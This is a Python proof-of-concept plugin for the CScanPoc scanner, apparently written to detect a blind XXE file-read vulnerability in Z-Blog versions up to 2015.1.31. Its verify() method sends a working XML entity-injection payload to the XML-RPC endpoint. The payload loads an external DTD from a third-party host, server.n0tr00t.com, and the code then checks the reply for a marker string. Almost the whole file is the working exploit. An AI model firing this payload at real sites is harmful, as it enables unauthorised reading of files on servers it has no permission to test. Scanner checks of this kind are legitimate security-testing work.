# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zblog_0002'  # 平台漏洞编号，留空
    name = 'Zblog 任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION  # 漏洞类型
    disclosure_date = '2015-06-09'  # 漏洞公布时间
    desc = '''
        Z-Blog是由RainbowSoft Studio开发的一款小巧而强大的基于Asp和PHP平台的开源程序，其创始人为朱煊(网名：zx.asd)。
        /zb_system/xml-rpc/index.php 直接调用simple_load_string解析XML，造成了一个XML实体注入。
        只在特定情况下有回显，是典型的blind-xxe.
    '''  # 漏洞描述
    ref = 'http://www.5kik.com/php0day/250.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zblog'  # 漏洞应用名称
    product_version = 'Zblog <=2015.1.31'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0f766a02-6fb5-4f5d-85c1-eb77ada15c39'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = self.target + "/zb_system/xml-rpc/index.php"

            data = '''<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
                    <!DOCTYPE root [
                    <!ENTITY % remote SYSTEM "http://server.n0tr00t.com/script/oob_poc.xml">
                    %remote;
                    ]>
                    </root>
                    <root/>      
            '''
            content = requests.post(verify_url, data=data, headers={
                                    'Content-Type': 'text/xml'}).text

            if '595bb9ce8726b4b55f538d3ca0ddfd' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
